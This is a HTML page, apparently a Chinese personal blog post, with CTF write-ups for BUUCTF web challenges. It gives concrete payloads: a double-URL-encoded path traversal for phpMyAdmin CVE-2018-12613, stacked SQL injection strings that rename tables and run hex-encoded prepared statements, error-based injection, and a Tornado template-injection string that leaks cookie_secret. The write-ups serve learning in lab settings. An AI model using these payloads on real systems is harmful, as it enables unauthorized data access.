@@ -1,0 +1,176 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- Title -->
+    
+    <title>about - DV.K</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <meta name="keywords" content="DV.K CTFer" />
+    <link rel="stylesheet" href="/css/main.css" />
+    <link rel="stylesheet" href="/css/extend.css" />
+    <link rel="bookmark"  type="image/x-icon"  href="https://cdn.dvkunion.cn/logo.png"/>
+    <link rel="shortcut icon" href="https://cdn.dvkunion.cn/logo.png">
+    <noscript><link rel="stylesheet" href="/css/noscript.css" /></noscript>
+    <style>
+        #banner {
+            background-image: url("https://cdn.dvkunion.cn/bg.jpg");
+        }
+    </style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+
+    <body class="is-preload">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="page-wrapper">
+                <!-- Nav -->
+        <header id="header">
+            <h1 id="logo"><a href="/">DV.K</a></h1>
+            <nav id="nav">
+                <ul>
+                    <li><a href="/">主页</a></li>
+                    <li><a href="/archives/">文章</a>
+                        <ul>
+                            <li><a href="/archives/">归档</a><ul>
+                                    <a class="archive-link" href="/archives/2020/06/">2020 - 06</a></li><li><a class="archive-link" href="/archives/2019/12/">2019 - 12</a></li><li><a class="archive-link" href="/archives/2019/10/">2019 - 10</a></li><li><a class="archive-link" href="/archives/2019/08/">2019 - 08</a></li><li><a class="archive-link" href="/archives/2019/07/">2019 - 07</a></li><li><a class="archive-link" href="/archives/2019/06/">2019 - 06</a></li><li><a class="archive-link" href="/archives/2019/05/">2019 - 05</a></li><li><a class="archive-link" href="/archives/2019/03/">2019 - 03</a></li><li><a class="archive-link" href="/archives/2019/02/">2019 - 02</a></li><li><a class="archive-link" href="/archives/2019/01/">2019 - 01</a></li><li><a class="archive-link" href="/archives/2018/12/">2018 - 12</a></li><li><a class="archive-link" href="/archives/2018/11/">2018 - 11</a></li><li><a class="archive-link" href="/archives/2018/10/">2018 - 10</a>
+                                </ul></li>
+                            <li><a href="/tags/">标签</a></li>
+                            <li><a href="/categories/">分类</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="/gallery/">图库</a></li>
+                </ul>
+            </nav>
+        </header>
+
+        <!-- Banner -->
+        
+
+        
+
+        <!-- Main -->
+        <div id="main" class="wrapper style1">
+            <div class="container">
+                <header class="major">
+                    <h2>BUUCTF</h2>
+                    <p>2019-10-07</p>
+                     <p>文章共计 - 1.5k 字 阅读需要 - 5 分钟</p>
+                </header>
+
+                <!-- Content -->
+                <section id="content">
+                    <div class ="post_page_title_img" style="background-image: url(http://cdn.dvkunion.cn/301565450111_.pic_hd.jpg);" ></div>
+                    <hr>
+                    <h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><center><small>2019-10-07</small></center>
+一天一道CTF，满脸写着高兴，浑身都是干劲。
+
+<center><small>华丽的分割线</small></center>
+
+<hr>
+<h3 id="0x01-WEB"><a href="#0x01-WEB" class="headerlink" title="0x01- - WEB"></a><b>0x01- - WEB</b></h3><p><b>01-[HCTF 2018]WarmUp</b></p>
+<p>第一题是一个代码审计，考一个cve，phpMyAdmin 4.8.0和4.8.1的文件包含，编号CVE-2018-12613。<br>这题在国赛线下赛的时候也做过，当时直接查到了原题。。。作为复现重新理一遍。</p>
+<p>首先打开会发现一个滑稽，然后F12大法发现了source.php，得到了源码，发现还存在一个hint.php。<br>hint.php告诉了我们flag所存在的文件名。</p>
+<p>然后我们把重点放到source.php身上：</p>
+<p><img src="http://cdn.dvkunion.cn//myblog/BUUCTFWX20191007-233153@2x.png" class="lazyload" data-srcset="http://cdn.dvkunion.cn//myblog/BUUCTFWX20191007-233153@2x.png" srcset="/css/images/overlay.png" alt=""></p>
+<p>首先是一个class类，提供了一共公共的方法checkfile。要求我们输入一个file参数，这个file参数要是字符串(is_string)并且满足checkfile函数才能被include加载，也就是说我们需要构造一个满足checkfile的payload使其加载hint.php内提到的ffffllllaaaagggg文件。<br>分析checkfile函数：首先定义了一个白名单，将source和hint作为白名单参数。然后进行了第一次if判断：要求满足非空且为字符串。</p>
+<p>之后就是关键的部分了：分别进行了三次判断，判断我们传入的file参数是否满足白名单。</p>
+<pre class=" language-lang-php"><code class="language-lang-php">if (in_array($page, $whitelist)) &#123
+    return true;
+&#125
+</code></pre>
+<p>第一次判断和第二次判断之间进行了一次mb_substr操作，mb_substr将page参数按照’?’进行了截断，mb_strpos可以返回查找到的第一个?的位置。</p>
+<pre class=" language-lang-php"><code class="language-lang-php">$_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+</code></pre>
+<p>第二次和第三次之间还进行了一次url解码：</p>
+<pre class=" language-lang-php"><code class="language-lang-php">$_page = urldecode($page);
+$_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+</code></pre>
+<p>那么整体的逻辑就出来了，就是对file参数进行校验，三次判断中如果有一次满足条件即可。可以通过二次url编码使得?绕过检测从而截断文件名使得checkfile函数返回true通过判断，最后通过include加载source.php?../../../文件，经过双重编码的参数会被当作一个路径进行加载，导致目录穿越读取到了文件。<br>最终payload:file=source.php%253f/../../../../../ffffllllaaaagggg 但是题目好像直接用?不需要二次编码也能读到?不知道为啥。</p>
+<p><b>02-[强网杯 2019]随便注1</b></p>
+<p>提示是注入题目，简单测试以后发现有一个正则过滤：</p>
+<p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
+<p>虽然可以使用and、or，但是过滤了select。。。被卡在这里。</p>
+<p>然后学到了新的东西：堆注。(搞这么久我居然都没用过堆注。。。)</p>
+<p>堆注用的主要是没有过滤’;’和show等关键字。在sql中，’;’表示一个语句的结束，当我们在参数内引入;来结束原sql语句并在后方构造想要自己执行的sql语句，就构成了堆叠注入。  </p>
+<p>那么很明显了。。这道题没有过滤‘;’，我们构造payload:inject=1’;show databases;#可以看到所有的数据库。</p>
+<p>show columns from 表名 可以看字段，但是对于纯数字的表明要加反引号：</p>
+<p>查到了列之后就要搞存储的数据。。。但是select被禁了。这里发现了两个大佬的思路：</p>
+<p>1.将纯数字的表替换成words表，这样能够在前端把所有数据炸出来。(alter、rename)</p>
+<p>payload1:/?inject=1’;ALTER TABLE <code>1919810931114514</code> ADD <code>id</code> INT(1) NOT NULL DEFAULT ‘1’ AFTER <code>flag</code>;%23’;alter+table+<code>1919810931114514</code>+rename+to+<code>xxx</code>;alter+table+<code>words</code>+rename+to+<code>zzz</code>;alter+table+<code>xxx</code>+rename+to+<code>words</code></p>
+<p>payload2:/?inject=1’;RENAME TABLE <code>words</code> TO <code>words1</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</p>
+<p>2.编码加密绕过(prepare、execute、十六进制绕过、动态拼接)</p>
+<p>payload1:/?inject=1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare%20execsql%20from%20@a;execute%20execsql;#</p>
+<p>payload2:’;use information_schema;set @sql=concat(‘s’,’elect column_name from columns wher’,’e table_name=”1919810931114514”‘);PREPARE stmt1 FROM @sql;EXECUTE stmt1;—+</p>
+<p>附加一点。报错注入：inject=-1%27%20and%20extractvalue(1,concat(1,version()))—+</p>
+<p><b>03-easy_tornado</b></p>
+<p>观察一圈，给了三个txt，第一个告诉你flag位置，第二个welcome,提示渲染函数render，第三个提示hash算法，如果能够拿到cookie_secret就可以结合文件名算出md5，再尝试目录穿越读取flag文件。</p>
+<p>毫无思路，去找大佬。然后学习到了新的：模版注入（SSIT、服务器模版注入）。</p>
+<p>题目叫做tornado。是python的web框架，大佬说可以使用模版注入，通过报错把cookie炸出来。<br>发现报错页面使用的msg参数是一个模版参数<code>msg=&amp;#123&amp;#123&amp;#125&amp;#125</code>会把传入的参数显示出来。</p>
+<p>然后构造payload:<code>msg=&amp;#123&amp;#123headler.settings&amp;#125&amp;#125</code>炸出cookie，直接算出md5即可。。。</p>
+<p>那么这里面一共有几个知识点，渲染函数render、tornado的setting函数、模版注入攻击(SSIT)。</p>
+<p><b>04-[强网杯 2019]高明的黑客</b></p>
+<p>题目直接给了源码。下载源码是一堆混淆了的php文件。。。想起来噩梦的 那题，又放弃了<br>继续根据wp学习吧。<br>然后看了wp后，不得不佩服大佬们细心、耐心、扎实的基础、以及稀奇古怪、骚的不行的姿势。<u>大佬:基本操作，坐下！</u><br>总之就是，大佬 永远知道自己在干什么，出题人想干什么；而我不知道出题人想干啥，也不知道自己要干啥。</p>
+<p>首先看到这么多文件，都是被混淆了，但是并没有完全的混淆，仔细的观察能够发现存在着get、post等方法，那么直接去fuzz所有的文件并尝试寻找一句话。。。   </p>
+<p>行吧，纯当练习py脚本了。</p>
+<p><b>04-admin</b></p>
+<p>贴上大佬的博客。。。tql。。。<a href="https://www.anquanke.com/post/id/164086#h2-10" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086#h2-10</a></p>
+<p>打开是一个欢迎界面，有登陆和注册功能。fuzz发现登陆处单引号报错。<br>尝试万能密码登陆，失败。</p>
+<p>返回进行注册。</p>
+
+                </section>
+
+            </div>
+        </div>
+    </div>
+    <footer id="footer">
+        <!--  copyright  -->
+        <ul class="copyright">
+            <li>&copy;2018-2022 DVK</li><li>Powered by Hexo</li><li>Design: DVK</li>
+        </ul>
+        
+        <ul class="copyright">
+            <img src="https://image.3001.net/images/20210606/16229429757102.png" class="lazyload" data-srcset="https://image.3001.net/images/20210606/16229429757102.png" srcset="/css/images/overlay.png"> <liICP>鲁ICP备2021028491号</liICP>
+        </ul>
+        
+        <!--  script  -->
+        <script src="/js/jquery.min.js"></script>
+        <script src="/js/jquery.scrolly.min.js"></script>
+        <script src="/js/jquery.dropotron.min.js"></script>
+        <script src="/js/jquery.scrollex.min.js"></script>
+        <script src="/js/browser.min.js"></script>
+        <script src="/js/breakpoints.min.js"></script>
+        <script src="/js/util.js"></script>
+        <script src="/js/main.js"></script>
+        <script src="/js/lazyload.js"></script>
+        <script type="text/javascript" src="/js/mouse.js"></script>
+    </footer><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+</body>
+
+
+</html>
